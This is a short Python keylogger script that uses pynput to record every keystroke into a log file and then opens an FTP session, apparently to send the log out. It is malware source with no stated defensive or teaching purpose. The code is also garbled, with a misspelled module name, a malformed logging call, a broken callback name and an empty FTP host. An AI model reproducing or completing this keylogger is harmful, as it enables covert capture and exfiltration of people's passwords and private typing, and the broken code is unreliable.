from pynput.keyboard import Key,Listener
import ftplib
import logging

logdir = ""
 logging.basicConfig(filename=(logdir+"klog-res.txt"),level=loggong.DEBUG="%(asctime)s:%(message)s")

def pressing_key(Key):
    try:
        logging.info(str(Key))
    except AttributeError:
        print("A special key has been pressed")

def releasing_key(key):
    if key == Key.esc:
        return False
print("\n Started listening....")

with Listener(on_press=pressing_key, on_release=releasing+key) as listener:
    listener.join()

print("\n Connecting ...")

sess = ftplib.FTP("")
